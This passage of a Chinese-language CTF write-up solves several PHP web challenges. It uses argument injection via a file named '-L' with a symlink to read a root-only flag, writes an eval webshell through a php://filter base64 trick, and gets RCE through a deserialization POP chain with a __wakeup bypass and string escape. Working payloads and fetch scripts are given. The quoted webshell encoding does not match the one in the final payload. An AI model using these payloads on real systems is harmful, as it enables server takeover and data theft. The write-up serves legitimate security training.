5. `/tmp/flag`只有`root`可以访问，而我们又只是`www-data`，得想办法让有`root`权限的帮我们访问。先在`/primary`中创建一个名叫 `-L` 的空文件：`touch /var/www/html/primary/-L` 。再创建一个软链接指向 `/tmp/flag`：`ln -s /tmp/flag /var/www/html/primary/link.txt`。这样，脚本在做拷贝的时候就会执行`cp -P -L link.txt /var/www/html/marstream/`。`-L` 会被误解成参数名覆盖掉 `-P`：从 复制软链接本身 变成了 跟随软链接，复制真实文件内容。这样，`Link.txt` 里就不再是目标路径，而变成了`/tmp/flag`里的内容，然后`chmod 755 -R /var/www/html/marstream/`又会将`/marstream`下的文件变得可读！（`-L`复制后，新副本的权限默认跟随源文件，所以 `link.txt` 原本在`/marstream`中是只有`root`才有权限访问的。）

# ezphp

1. 传一个`num`，得是字符串，不能和411413宽松相等，不能有字母和小数点，得有0但第一位不能是0，`intval($num,0)`必须得是411413。![image-20261029211442566](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261029211442762.png)

   十进制、二进制和十六进制等于411413都被排除了，只剩八进制。0 后面跟 1443425，0前面补一个空格绕过`!is_string($num))`，所以 payload 是：`  01443425`。

   <img src="https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261029221750965.jpg" alt="e5158b4d11e481a7c7850ffa69ccdc71" style="zoom:50%;" />

2. 进入第二关。传俩参数，一个GET，一个POST，都得是字符串。GET传文件名；POST传文件内容，会写在`/var/www/html/`下，但是开头要先拼一句`<?php exit;?>`。

   ![image-20261029222352049](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261029222352142.png)

   用 `php://filter` 写入链绕过。把 `filename` 设为流封装地址`php://filter/write=convert.base64-decode/resource=shell.php`,在写入的时候做下手脚：`write=` 后的过滤器作用于正在写入的数据流，处理完再落盘到 `resource=` 指定的真实文件，所以落盘前`<?php exit;?>` 和真实 content 会一起先过一遍 base64 解码器。base64 解码器会跳过所有不在 base64 字母表（A–Z a–z 0–9 + / =）里的字符，`<?php exit;?>` 中的 `< ? ; 空格 >` 全被丢弃，只剩 `phpexit`七个字符。

   但是base64 是以 4 个字符一组解码成 3 个字节，所以会再吞掉 content 的第 1 个字符凑成 2 组，所以要在真实 content前再随便补一个base64 字符充数就行了，这里用 a。这样，phpexita解码出来就是 6 个无意义的字节。后面的真实content写为一句话木马的base64编码：`PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=`。所以，完整 payload 为：`aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7`。

   开始写马：

   ```
   fetch('/death.php?filename=php://filter/write=convert.base64-decode/resource=shell.php', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: 'content=aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7'
   }).then(r => r.text().then(t => console.log(r.status, t.split('</code>').pop())))
   ```

# ez_pop

1. 入口段如下：接收两个参数：user 和 sign 后实例化类A，然后对这个对象进行序列化，再交给`filter`函数处理序列化字符串，最后反序列化回来。

   ```
   if (isset($_GET['user']) && isset($_GET['sign'])) {
       $u = $_GET['user'];
       $s = $_GET['sign'];
   
       $entry = new A($u, $s);
       $ser = serialize($entry);
       
       $escaped = filter($ser);
   
       unserialize($escaped);
   } else {
       echo "w(ﾟДﾟ)w";
   }
   ```

   `sink` 在类F：只要能让 `__set` 被调用、且 `$name` 恰好是 `flag_trigger`，就可以拿到 RCE。

   ```
   class F {
       private $flag_trigger;
   
       public function __set($name, $value) {
   
           if ($name !== 'flag_trigger') {
               return;
           }
   
           echo "RCE:<br>";
   
   
           system($value);
       }
   }
   ```

   我们要利用的点就是伪造一个序列化对象文本，让 `unserialize()` 在进行反序列化的时候将我们文本描述的对象原样建到内存里，从而自动触发一系列魔术方法到达 `sink`。

   下面构造POP链：

   入口是A，A 的`__destruct()`会把 `sign` 拼进一句话里打印。拼接要求两边都是字符串，所以如果`sign` 里装的不是字符串，而是对象的话，PHP 就要去这个对象的类里调用 `__toString` 。所以 sign = B的对象。

   B 的`__toString` 里要求同时满足 action 是一个对象，且它的类里包含 `__invoke` 方法，然后会把这个对象当成函数去调用。所以 action = C的对象。

   C 的`__invoke`要求属性 target 必须得是一个对象，而属性 method 得是一个字符串。同时 target 的类里必须包含`__call`方法，且不能有 method 方法。然后`__invoke`中会去调用 target这个对象里不存在的 method 方法。所以，target = D的对象。

   D 的`__call`只要求属性 next 是一个对象，属性 property是一个字符串。然后会去读取 next 中的 属性 p，所以只要让 next =E的对象，p 就不存在，`__get`就会被触发。

   E 的`__get`直接要求 sink 必须是 F 的实例，然后会给 sink 中的`flag_trigger`属性赋值为`$cmd`，而 F中的`flag_trigger`是私有属性，正好触发 `__set`。

   所以这条 POP链就是：

   ```
   A::__destruct → B::__toString → C::__invoke → D::__call → E::__get → F::__set → system()
   ```

   payload为：

   ```
   O:1:"B":1:{
       s:6:"action";
       O:1:"C":2:{
           s:6:"target";
           O:1:"D":2:{
               s:4:"next";
               O:1:"E":2:{
                   s:4:"sink";O:1:"F":0:{}
                   s:3:"cmd";s:LEN:"$cmd";
               }
               s:8:"property";s:0:"";
           }
           s:6:"method";s:0:"";
       }
   }
   ```

2. `B::__wakeup` 会在 `unserialize` 创建对象的时候触发，然后把 `$action` 置为 null，这样我们的POP链就断了。所以必须绕过 `__wakeup` 。这是经典的`CVE-2016-7124`：序列化串里对象头 `O:1:"B":属性个数:` 中的属性个数如果大于花括号里实际给出的属性条目数，受影响版本的 PHP（PHP < 5.6.25、< 7.0.10）会认为数据损坏、放弃继续读属性，同时跳过 `__wakeup`。所以只要B 的头部写 `O:1:"B":2:`，但实际只有`action` 一个属性就可以绕过`__wakeup`。

   ```
   O:1:"B":2:{
       s:6:"action";
       O:1:"C":2:{
           s:6:"target";
           O:1:"D":2:{
               s:4:"next";
               O:1:"E":2:{
                   s:4:"sink";O:1:"F":0:{}
                   s:3:"cmd";s:LEN:"$cmd";
               }
               s:8:"property";s:0:"";
           }
           s:6:"method";s:0:"";
       }
   }
   ```

   

3. 入口 `new A($u, $s)` 的两个参数来自 GET，只能是字符串。直接把 现在的 payload 传进去，它就只是 A 的一个字符串属性值，`unserialize` 不会把它当对象。所以还需要进行字符串逃逸。可以利用的点是`$escaped = filter($ser);` ，`filter`会将`admin`替换成 `hacker`。替换发生在序列化之后，但序列化串里的长度字段 `s:长度:` 不会跟着变。

   我们可以在真正的pyload前塞多个admin，然后补一个`";`和`s:4:"sign";`，后面跟一个`}`用于闭合： `"admin"`×N + `";` +`s:4:"sign";`+ payload+`}`这种形式，然后赋给 user。因为`unserialize` 解析 `s:LEN:"…"` 的规则是：跳过引号后精确读 LEN 个字节当值，然后要求紧跟 `";`。我们要让读取的终点恰好落在 hacker 串的末尾，这样它下一个看到的就是我们埋的 `";`，user的值就变成了一堆hacker。就是再往后就是 `s:4:"sign";` + payload+ `}`：`s:4:"sign";O:1:"B":2:{……}}`。`}` 把 A 提前闭合，原始串剩下的 `";s:4:"sign";s:1:"x";}` 成了尾部垃圾被完全忽略。sign属性成功变成了我们伪造的对象。

   来推导一下：

   ```
   读取终点落在 "hacker"×N 的末尾 → LEN = 6N（hacker×N 的总长）→ 5N + 2 + 11+ I +1 = 6N → N = I + 14 
   ```

   所以 admin 的个数 = payload的长度 + 14 。

4. 发送请求：

   ```
   let payload = 'O:1:"B":2:{s:6:"action";O:1:"C":2:{s:6:"target";O:1:"D":2:{s:4:"next";O:1:"E":2:{s:4:"sink";O:1:"F":0:{}s:3:"cmd";s:6:"cat /*";}s:8:"property";s:0:"";}s:6:"method";s:0:"";}}';
   let user = 'admin'.repeat(payload.length + 14) + '";' + 's:4:"sign";' + payload + '}';
   fetch('/' + '?' + new URLSearchParams({user: user, sign: 'x'}))
     .then(r => r.text().then(t => { console.log(r.status); console.log(t.slice(t.indexOf('Welcome to Geek'))); }));
   ```
